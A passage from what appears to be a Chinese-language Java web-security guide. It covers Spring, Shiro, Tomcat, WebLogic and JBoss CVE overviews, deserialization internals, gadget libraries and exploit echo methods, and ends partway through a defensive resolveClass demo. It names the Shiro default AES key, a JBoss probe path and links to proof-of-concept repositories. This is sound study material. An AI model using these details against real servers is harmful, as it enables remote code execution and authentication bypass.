&lt;li&gt;用户发送请求给服务器&lt;/li&gt;
&lt;li&gt;服务器收到请求，使用 DispatchServlet 处理&lt;/li&gt;
&lt;li&gt;Dispatch 使用 HandleMapping 检查 url 是否有对应的 Controller，如果有，执行&lt;/li&gt;
&lt;li&gt;如果 Controller 返回字符串，ViewResolver 将字符串转换成相应的视图对象&lt;/li&gt;
&lt;li&gt;DispatchServlet 将视图对象中的数据，输出给服务器&lt;/li&gt;
&lt;li&gt;服务器将数据输出给客户端&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&#34;cve概览&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#cve概览&#34;&gt;#&lt;/a&gt; CVE 概览&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;CVE-2018-1270
&lt;ul&gt;
&lt;li&gt;Spring Websocket 远程代码执行漏洞&lt;/li&gt;
&lt;li&gt;Spring Framework 5.0 - 5.0.5&lt;/li&gt;
&lt;li&gt;Spring Framework 4.3 - 4.3.15&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;CVE-2018-1273
&lt;ul&gt;
&lt;li&gt;Spring Data 远程代码执行漏洞&lt;/li&gt;
&lt;li&gt;Spring Data Commons 1.13 - 1.13.10&lt;/li&gt;
&lt;li&gt;Spring Data Commons 2.0 - 2.0.5&lt;/li&gt;
&lt;li&gt;Spring Data REST 2.6 - 2.6.10&lt;/li&gt;
&lt;li&gt;Spring Data REST 3.0 - 3.0.5&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;CVE-2017-8046
&lt;ul&gt;
&lt;li&gt;Spring Data REST 远程代码执行漏洞&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;CVE-2017-4971
&lt;ul&gt;
&lt;li&gt;Spring Web Flow 远程代码执行漏洞&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id=&#34;shiro&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#shiro&#34;&gt;#&lt;/a&gt; Shiro&lt;/h2&gt;
&lt;h3 id=&#34;简介-5&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#简介-5&#34;&gt;#&lt;/a&gt; 简介&lt;/h3&gt;
&lt;p&gt;Apache Shiro 是一个功能强大且易于使用的 Java 安全框架，功能包括身份验证，授权，加密和会话管理。&lt;/p&gt;
&lt;h3 id=&#34;cve概览-2&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#cve概览-2&#34;&gt;#&lt;/a&gt; CVE 概览&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;CVE-2020-13933
&lt;ul&gt;
&lt;li&gt;Apache Shiro &amp;lt; 1.6.0&lt;/li&gt;
&lt;li&gt;身份验证绕过漏洞&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;CVE-2020-11989
&lt;ul&gt;
&lt;li&gt;SHIRO-782&lt;/li&gt;
&lt;li&gt;Apache Shiro &amp;lt; 1.5.3&lt;/li&gt;
&lt;li&gt;身份验证绕过漏洞&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;CVE-2020-1957
&lt;ul&gt;
&lt;li&gt;SHIRO-682&lt;/li&gt;
&lt;li&gt;Apache Shiro &amp;lt; 1.5.2&lt;/li&gt;
&lt;li&gt;身份验证绕过漏洞&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;CVE-2019-12422
&lt;ul&gt;
&lt;li&gt;SHIRO-721&lt;/li&gt;
&lt;li&gt;Apache Shiro &amp;lt; 1.4.2&lt;/li&gt;
&lt;li&gt;Padding Oracle Attack 远程代码执行漏洞&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;CVE-2016-4437
&lt;ul&gt;
&lt;li&gt;SHIRO-550&lt;/li&gt;
&lt;li&gt;Apache Shiro &amp;lt;= 1.2.4&lt;/li&gt;
&lt;li&gt;反序列化远程代码执行漏洞&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;CVE-2014-0074
&lt;ul&gt;
&lt;li&gt;SHIRO-460&lt;/li&gt;
&lt;li&gt;Apache Shiro &amp;lt; 1.2.3&lt;/li&gt;
&lt;li&gt;身份验证绕过漏洞&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&#34;cve-2020-13933&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#cve-2020-13933&#34;&gt;#&lt;/a&gt; CVE-2020-13933&lt;/h3&gt;
&lt;p&gt;Apache Shiro 1.6.0 之前的版本，由于 Shiro 拦截器与 requestURI 的匹配流程与 Web 框架的拦截器的匹配流程有差异，攻击者构造一个特殊的 http 请求，可以绕过 Shiro 的认证，未授权访问敏感路径。&lt;/p&gt;
&lt;h3 id=&#34;cve-2020-11989&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#cve-2020-11989&#34;&gt;#&lt;/a&gt; CVE-2020-11989&lt;/h3&gt;
&lt;p&gt;Apache Shiro 1.5.3 之前的版本，由于 Shiro 拦截器与 requestURI 的匹配流程与 Web 框架的拦截器的匹配流程有差异，攻击者构造一个特殊的 http 请求，可以绕过 Shiro 的认证，未授权访问敏感路径。此漏洞存在两种攻击方式。&lt;/p&gt;
&lt;h3 id=&#34;cve-2020-1957&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#cve-2020-1957&#34;&gt;#&lt;/a&gt; CVE-2020-1957&lt;/h3&gt;
&lt;p&gt;Apache Shiro 1.5.2 之前的版本，由于 Shiro 拦截器与 requestURI 的匹配流程与 Web 框架的拦截器的匹配流程有差异，攻击者构造一个特殊的 http 请求，可以绕过 Shiro 的认证，未授权访问敏感路径。&lt;/p&gt;
&lt;h3 id=&#34;cve-2019-12422&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#cve-2019-12422&#34;&gt;#&lt;/a&gt; CVE-2019-12422&lt;/h3&gt;
&lt;p&gt;Apache Shiro 1.4.2 之前的版本默认使用  &lt;code&gt;AES/CBC/PKCS5Padding&lt;/code&gt;  模式加密，开启 RememberMe 功能的 Shiro 组件将允许远程攻击者构造序列化数据，通过 Padding Oracle Attack 进行爆破，即使在秘钥未知的条件下，也可以在目标服务器上执行任意命令。&lt;/p&gt;
&lt;h3 id=&#34;cve-2016-4437&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#cve-2016-4437&#34;&gt;#&lt;/a&gt; CVE-2016-4437&lt;/h3&gt;
&lt;p&gt;Apache Shiro 1.2.5 之前的版本在  &lt;code&gt;org.apache.shiro.mgt.AbstractRememberMeManager&lt;/code&gt;  中存在 AES 默认秘钥  &lt;code&gt;kPH+bIxk5D2deZiIxcaaaA==&lt;/code&gt;  ，开启 RememberMe 功能的 Shiro 组件将允许远程攻击者构造序列化数据，在目标服务器上执行任意命令。&lt;/p&gt;
&lt;h1 id=&#34;容器&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#容器&#34;&gt;#&lt;/a&gt; 容器&lt;/h1&gt;
&lt;p&gt;常见的 Java 服务器有 Tomcat、Weblogic、JBoss、GlassFish、Jetty、Resin、IBM Websphere 等，这里对部分框架做一个简单的说明。&lt;/p&gt;
&lt;h2 id=&#34;tomcat&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#tomcat&#34;&gt;#&lt;/a&gt; Tomcat&lt;/h2&gt;
&lt;p&gt;Tomcat 是一个轻量级应用服务器，在中小型系统和并发访问用户不是很多的场合下被普遍使用，用于开发和调试 JSP 程序。&lt;/p&gt;
&lt;p&gt;在收到请求后，Tomcat 的处理流程如下：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;客户端访问 Web 服务器，发送 HTTP 请求&lt;/li&gt;
&lt;li&gt;Web 服务器接收到请求后，传递给 Servlet 容器&lt;/li&gt;
&lt;li&gt;Servlet 容器加载 Servlet，产生 Servlet 实例后，向其传递表示请求和响应的对象&lt;/li&gt;
&lt;li&gt;Servlet 实例使用请求对象得到客户端的请求信息，然后进行相应的处理&lt;/li&gt;
&lt;li&gt;Servlet 实例将处理结果通过响应对象发送回客户端，容器负责确保响应正确送出，同时将控制返回给 Web 服务器&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;Tomcat 服务器是由一系列可配置的组件构成的，其中核心组件是 Catalina Servlet 容器，它是所有其他 Tomcat 组件的顶层容器。&lt;/p&gt;
&lt;h3 id=&#34;相关cve-2&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#相关cve-2&#34;&gt;#&lt;/a&gt; 相关 CVE&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;CVE-2020-1938
&lt;ul&gt;
&lt;li&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly93d3cuZnJlZWJ1Zi5jb20vdnVscy8yMjgxMDguaHRtbA==&#34;&gt;https://www.freebuf.com/vuls/228108.html&lt;/span&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;CVE-2019-0232
&lt;ul&gt;
&lt;li&gt;远程代码执行&lt;/li&gt;
&lt;li&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9naXRodWIuY29tL3B5bjNyZC9DVkUtMjAxOS0wMjMyLw==&#34;&gt;https://github.com/pyn3rd/CVE-2019-0232/&lt;/span&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;CVE-2017-12615
&lt;ul&gt;
&lt;li&gt;任意文件写入&lt;/li&gt;
&lt;li&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9tcC53ZWl4aW4ucXEuY29tL3M/X19iaXo9TXpJMU5EZzRNVEl4TXc9PSZhbXA7bWlkPTIyNDc0ODM2NTkmYW1wO2lkeD0xJmFtcDtzbj1jMjNiM2EzYjNiNDNkNzA5OTliZGJlNjQ0ZTc5ZjdlNQ==&#34;&gt;https://mp.weixin.qq.com/s?__biz=MzI1NDg4MTIxMw==&amp;amp;mid=2247483659&amp;amp;idx=1&amp;amp;sn=c23b3a3b3b43d70999bdbe644e79f7e5&lt;/span&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;CVE-2013-2067&lt;/li&gt;
&lt;li&gt;CVE-2012-4534&lt;/li&gt;
&lt;li&gt;CVE-2012-4431&lt;/li&gt;
&lt;li&gt;CVE-2012-3546&lt;/li&gt;
&lt;li&gt;CVE-2012-3544&lt;/li&gt;
&lt;li&gt;CVE-2012-2733&lt;/li&gt;
&lt;li&gt;CVE-2011-3375&lt;/li&gt;
&lt;li&gt;CVE-2011-3190&lt;/li&gt;
&lt;li&gt;CVE-2008-2938&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id=&#34;weblogic&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#weblogic&#34;&gt;#&lt;/a&gt; Weblogic&lt;/h2&gt;
&lt;h3 id=&#34;简介-6&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#简介-6&#34;&gt;#&lt;/a&gt; 简介&lt;/h3&gt;
&lt;p&gt;WebLogic 是美国 Oracle 公司出品的一个 Application Server，是一个基于 Java EE 架构的中间件，WebLogic 是用于开发、集成、部署和管理大型分布式 Web 应用、网络应用和数据库应用的 Java 应用服务器。其将 Java 的动态功能和 Java Enterprise 标准的安全性引入大型网络应用的开发、集成、部署和管理之中。&lt;/p&gt;
&lt;p&gt;WebLogic 对业内多种标准的全面支持，包括 EJB、JSP、Servlet、JMS、JDBC 等。&lt;/p&gt;
&lt;h3 id=&#34;相关cve-3&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#相关cve-3&#34;&gt;#&lt;/a&gt; 相关 CVE&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;CVE-2019-2725
&lt;ul&gt;
&lt;li&gt;wls-wsat 反序列化远程代码执行&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;CVE-2019-2658&lt;/li&gt;
&lt;li&gt;CVE-2019-2650&lt;/li&gt;
&lt;li&gt;CVE-2019-2649&lt;/li&gt;
&lt;li&gt;CVE-2019-2648&lt;/li&gt;
&lt;li&gt;CVE-2019-2647&lt;/li&gt;
&lt;li&gt;CVE-2019-2646&lt;/li&gt;
&lt;li&gt;CVE-2019-2645&lt;/li&gt;
&lt;li&gt;CVE-2019-2618
&lt;ul&gt;
&lt;li&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9naXRodWIuY29tL2phczUwMm4vY3ZlLTIwMTktMjYxOC8=&#34;&gt;https://github.com/jas502n/cve-2019-2618/&lt;/span&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;CVE-2019-2615&lt;/li&gt;
&lt;li&gt;CVE-2019-2568&lt;/li&gt;
&lt;li&gt;CVE-2018-3252&lt;/li&gt;
&lt;li&gt;CVE-2018-3248&lt;/li&gt;
&lt;li&gt;CVE-2018-3245&lt;/li&gt;
&lt;li&gt;CVE-2018-3201&lt;/li&gt;
&lt;li&gt;CVE-2018-3197&lt;/li&gt;
&lt;li&gt;CVE-2018-3191
&lt;ul&gt;
&lt;li&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9naXRodWIuY29tL3ZvaWRmeW9vL0NWRS0yMDE4LTMxOTE=&#34;&gt;https://github.com/voidfyoo/CVE-2018-3191&lt;/span&gt;&lt;/li&gt;
&lt;li&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9naXRodWIuY29tL0xpYnJhZ2dib25kL0NWRS0yMDE4LTMxOTE=&#34;&gt;https://github.com/Libraggbond/CVE-2018-3191&lt;/span&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;CVE-2018-2894
&lt;ul&gt;
&lt;li&gt;任意文件上传&lt;/li&gt;
&lt;li&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly94ei5hbGl5dW4uY29tL3QvMjQ1OA==&#34;&gt;https://xz.aliyun.com/t/2458&lt;/span&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;CVE-2018-2893
&lt;ul&gt;
&lt;li&gt;反序列化&lt;/li&gt;
&lt;li&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly93d3cuZnJlZWJ1Zi5jb20vdnVscy8xNzgxMDUuaHRtbA==&#34;&gt;https://www.freebuf.com/vuls/178105.html&lt;/span&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;CVE-2018-2628
&lt;ul&gt;
&lt;li&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9tcC53ZWl4aW4ucXEuY29tL3MvbllZNHpnMm0yeHNxVDBHWGE5cE1HQQ==&#34;&gt;https://mp.weixin.qq.com/s/nYY4zg2m2xsqT0GXa9pMGA&lt;/span&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;CVE-2018-1258&lt;/li&gt;
&lt;li&gt;CVE-2017-10271
&lt;ul&gt;
&lt;li&gt;XMLDecoder 反序列化漏洞&lt;/li&gt;
&lt;li&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cDovL3dlYmNhY2hlLmdvb2dsZXVzZXJjb250ZW50LmNvbS9zZWFyY2g/cT1jYWNoZSUzQXNIN2o4VEY4dU9JSiUzQXd3dy5mcmVlYnVmLmNvbSUyRnZ1bHMlMkYxNjAzNjcuaHRtbA==&#34;&gt;http://webcache.googleusercontent.com/search?q=cache%3AsH7j8TF8uOIJ%3Awww.freebuf.com%2Fvuls%2F160367.html&lt;/span&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;CVE-2017-3248&lt;/li&gt;
&lt;li&gt;CVE-2016-3510&lt;/li&gt;
&lt;li&gt;CVE-2015-4852
&lt;ul&gt;
&lt;li&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9naXRodWIuY29tL3JvbzdicmVhay9zZXJpYWxhdG9y&#34;&gt;https://github.com/roo7break/serialator&lt;/span&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id=&#34;jboss&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#jboss&#34;&gt;#&lt;/a&gt; JBoss&lt;/h2&gt;
&lt;h3 id=&#34;简介-7&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#简介-7&#34;&gt;#&lt;/a&gt; 简介&lt;/h3&gt;
&lt;p&gt;JBoss 是一个基于 J2EE 的管理 EJB 的容器和服务器，但 JBoss 核心服务不包括支持 servlet/JSP 的 WEB 容器，一般与 Tomcat 或 Jetty 绑定使用。&lt;/p&gt;
&lt;h3 id=&#34;相关cve-4&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#相关cve-4&#34;&gt;#&lt;/a&gt; 相关 CVE&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;CVE-2017-12149
&lt;ul&gt;
&lt;li&gt;反序列化漏洞&lt;/li&gt;
&lt;li&gt;访问  &lt;code&gt;/invoker/readonly&lt;/code&gt;  ，页面存在即有反序列化漏洞&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id=&#34;jetty&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#jetty&#34;&gt;#&lt;/a&gt; Jetty&lt;/h2&gt;
&lt;h3 id=&#34;简介-8&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#简介-8&#34;&gt;#&lt;/a&gt; 简介&lt;/h3&gt;
&lt;p&gt;Jetty 是一个开源的 servlet 容器。&lt;/p&gt;
&lt;h1 id=&#34;沙箱&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#沙箱&#34;&gt;#&lt;/a&gt; 沙箱&lt;/h1&gt;
&lt;h2 id=&#34;简介-9&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#简介-9&#34;&gt;#&lt;/a&gt; 简介&lt;/h2&gt;
&lt;p&gt;Java 实现了一套沙箱环境，使远程的非可信代码只能在受限的环境下执行。&lt;/p&gt;
&lt;h2 id=&#34;相关cve-5&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#相关cve-5&#34;&gt;#&lt;/a&gt; 相关 CVE&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;CVE-2012-0507&lt;/li&gt;
&lt;li&gt;CVE-2012-4681&lt;/li&gt;
&lt;li&gt;CVE-2017-3272&lt;/li&gt;
&lt;li&gt;CVE-2017-3289&lt;/li&gt;
&lt;/ul&gt;
&lt;h1 id=&#34;反序列化&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#反序列化&#34;&gt;#&lt;/a&gt; 反序列化&lt;/h1&gt;
&lt;h2 id=&#34;简介-10&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#简介-10&#34;&gt;#&lt;/a&gt; 简介&lt;/h2&gt;
&lt;p&gt;序列化就是把对象转换成字节流，便于保存在内存、文件、数据库中；反序列化即逆过程，由字节流还原成对象。一般用于远程调用、通过网络将对象传输至远程服务器、存储对象到数据库或本地等待重用等场景中。Java 中的  &lt;code&gt;ObjectOutputStream&lt;/code&gt;  类的  &lt;code&gt;writeObject()&lt;/code&gt;  方法可以实现序列化，类  &lt;code&gt;ObjectInputStream&lt;/code&gt;  类的  &lt;code&gt;readObject()&lt;/code&gt;  方法用于反序列化。如果要实现类的反序列化，则是对其实现  &lt;code&gt;Serializable&lt;/code&gt;  接口。&lt;/p&gt;
&lt;p&gt;当远程服务接受不可信的数据并进行反序列化且当前环境中存在可利用的类时，就认为存在反序列化漏洞。&lt;/p&gt;
&lt;h3 id=&#34;序列数据结构&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#序列数据结构&#34;&gt;#&lt;/a&gt; 序列数据结构&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;&lt;code&gt;0xaced&lt;/code&gt;  魔术头 / STREAM_MAGIC&lt;/li&gt;
&lt;li&gt;&lt;code&gt;0x0005&lt;/code&gt;  版本号 / STREAM_VERSION / 参考 java.io.ObjectStreamConstants&lt;/li&gt;
&lt;li&gt;&lt;code&gt;0x73&lt;/code&gt;  对象类型标识&lt;/li&gt;
&lt;li&gt;&lt;code&gt;0x72&lt;/code&gt;  类描述符标识&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&#34;序列化流程&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#序列化流程&#34;&gt;#&lt;/a&gt; 序列化流程&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;ObjectOutputStream 实例初始化时，将魔术头和版本号写入 bout (BlockDataOutputStream 类型) 中&lt;/li&gt;
&lt;li&gt;调用 ObjectOutputStream.writeObject () 开始写对象数据
&lt;ul&gt;
&lt;li&gt;ObjectStreamClass.lookup () 封装待序列化的类描述 (返回 ObjectStreamClass 类型) ，获取包括类名、自定义 serialVersionUID、可序列化字段 (返回 ObjectStreamField 类型) 和构造方法，以及 writeObject、readObject 方法等&lt;/li&gt;
&lt;li&gt;writeOrdinaryObject () 写入对象数据
&lt;ul&gt;
&lt;li&gt;写入对象类型标识&lt;/li&gt;
&lt;li&gt;writeClassDesc () 进入分支  writeNonProxyDesc () 写入类描述数据
&lt;ul&gt;
&lt;li&gt;写入类描述符标识&lt;/li&gt;
&lt;li&gt;写入类名&lt;/li&gt;
&lt;li&gt;写入 SUID (当 SUID 为空时，会进行计算并赋值)&lt;/li&gt;
&lt;li&gt;计算并写入序列化属性标志位&lt;/li&gt;
&lt;li&gt;写入字段信息数据&lt;/li&gt;
&lt;li&gt;写入 Block Data 结束标识&lt;/li&gt;
&lt;li&gt;写入父类描述数据&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;writeSerialData () 写入对象的序列化数据
&lt;ul&gt;
&lt;li&gt;若类自定义了 writeObject ()，则调用该方法写对象，否则调用 defaultWriteFields () 写入对象的字段数据 (若是非原始类型，则递归处理子对象)&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&#34;53713-反序列化流程&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#53713-反序列化流程&#34;&gt;#&lt;/a&gt; 5.3.7.1.3. 反序列化流程&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;ObjectInputStream 实例初始化时，读取魔术头和版本号进行校验&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;调用 ObjectInputStream.readObject () 开始读对象数据&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;读取对象类型标识&lt;/li&gt;
&lt;li&gt;readOrdinaryObject () 读取数据对象
&lt;ul&gt;
&lt;li&gt;readClassDesc () 读取类描述数据
&lt;ul&gt;
&lt;li&gt;读取类描述符标识，进入分支 readNonProxyDesc ()&lt;/li&gt;
&lt;li&gt;读取类名&lt;/li&gt;
&lt;li&gt;读取 SUID&lt;/li&gt;
&lt;li&gt;读取并分解序列化属性标志位&lt;/li&gt;
&lt;li&gt;读取字段信息数据&lt;/li&gt;
&lt;li&gt;resolveClass () 根据类名获取待反序列化的类的 Class 对象，如果获取失败，则抛出 ClassNotFoundException&lt;/li&gt;
&lt;li&gt;skipCustomData () 循环读取字节直到 Block Data 结束标识为止&lt;/li&gt;
&lt;li&gt;读取父类描述数据&lt;/li&gt;
&lt;li&gt;initNonProxy () 中判断对象与本地对象的 SUID 和类名 (不含包名) 是否相同，若不同，则抛出 InvalidClassException&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;ObjectStreamClass.newInstance () 获取并调用离对象最近的非 Serializable 的父类的无参构造方法 (若不存在，则返回 null) 创建对象实例&lt;/li&gt;
&lt;li&gt;readSerialData () 读取对象的序列化数据
&lt;ul&gt;
&lt;li&gt;若类自定义了 readObject ()，则调用该方法读对象，否则调用 defaultReadFields () 读取并填充对象的字段数据&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id=&#34;5372-漏洞利用&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#5372-漏洞利用&#34;&gt;#&lt;/a&gt; 5.3.7.2. 漏洞利用&lt;/h2&gt;
&lt;h3 id=&#34;53721-存在危险的基础库&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#53721-存在危险的基础库&#34;&gt;#&lt;/a&gt; 5.3.7.2.1. 存在危险的基础库&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;&lt;code&gt;com.mchange:c3p0 0.9.5.2&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;com.mchange:mchange-commons-java 0.2.11&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;commons-beanutils 1.9.2&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;commons-collections 3.1&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;commons-fileupload 1.3.1&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;commons-io 2.4&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;commons-logging 1.2&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;org.apache.commons:commons-collections 4.0&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;org.beanshell:bsh 2.0b5&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;org.codehaus.groovy:groovy 2.3.9&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;org.slf4j:slf4j-api 1.7.21&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;org.springframework:spring-aop 4.1.4.RELEASE&lt;/code&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&#34;53722-回显方式&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#53722-回显方式&#34;&gt;#&lt;/a&gt; 5.3.7.2.2. 回显方式&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;通过中间件特性回显&lt;/li&gt;
&lt;li&gt;通过抛出异常回显&lt;/li&gt;
&lt;li&gt;通过 OOB 回显&lt;/li&gt;
&lt;li&gt;通过写静态文件回显&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id=&#34;5373-漏洞修复和防护&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#5373-漏洞修复和防护&#34;&gt;#&lt;/a&gt; 5.3.7.3. 漏洞修复和防护&lt;/h2&gt;
&lt;h3 id=&#34;53731-hook-resolveclass&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#53731-hook-resolveclass&#34;&gt;#&lt;/a&gt; 5.3.7.3.1. Hook resolveClass&lt;/h3&gt;
&lt;p&gt;在使用  &lt;code&gt;readObject()&lt;/code&gt;  反序列化时会调用  &lt;code&gt;resolveClass&lt;/code&gt;  方法读取反序列化的类名，可以通过 hook 该方法来校验反序列化的类，一个 Demo 如下&lt;/p&gt;
&lt;figure class=&#34;highlight java&#34;&gt;&lt;figcaption data-lang=&#34;java&#34;&gt;&lt;/figcaption&gt;&lt;table&gt;&lt;tr&gt;&lt;td data-num=&#34;1&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token annotation punctuation&#34;&gt;@Override&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;2&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token keyword&#34;&gt;protected&lt;/span&gt; &lt;span class=&#34;token class-name&#34;&gt;Class&lt;/span&gt;&lt;span class=&#34;token generics&#34;&gt;&lt;span class=&#34;token punctuation&#34;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;?&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;&gt;&lt;/span&gt;&lt;/span&gt; &lt;span class=&#34;token function&#34;&gt;resolveClass&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token class-name&#34;&gt;ObjectStreamClass&lt;/span&gt; desc&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;token keyword&#34;&gt;throws&lt;/span&gt; &lt;span class=&#34;token class-name&#34;&gt;IOException&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;token class-name&#34;&gt;ClassNotFoundException&lt;/span&gt; &lt;span class=&#34;token punctuation&#34;&gt;&amp;#123;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;3&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;    &lt;span class=&#34;token keyword&#34;&gt;if&lt;/span&gt; &lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;!&lt;/span&gt;desc&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;token function&#34;&gt;getName&lt;/span&gt;&lt;span class=&#34;token 